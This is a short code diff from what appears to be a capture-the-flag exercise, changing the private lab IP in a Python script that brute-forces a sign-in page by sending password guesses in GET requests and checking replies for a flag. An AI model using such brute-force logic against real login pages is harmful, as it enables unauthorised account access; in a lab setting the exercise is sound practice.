@@ -11,7 +11,7 @@ def brute_force(passwords_file):
 
 def try_password(session, password):
   start = time.time()
-  url = f"http://10.13.200.245/index.php?page=signin&password={password}&Login=Login"
+  url = f"http://10.11.200.35/index.php?page=signin&password={password}&Login=Login"
   response = session.get(url)
   elapsed_s = time.time() - start
   if "flag" in response.text:
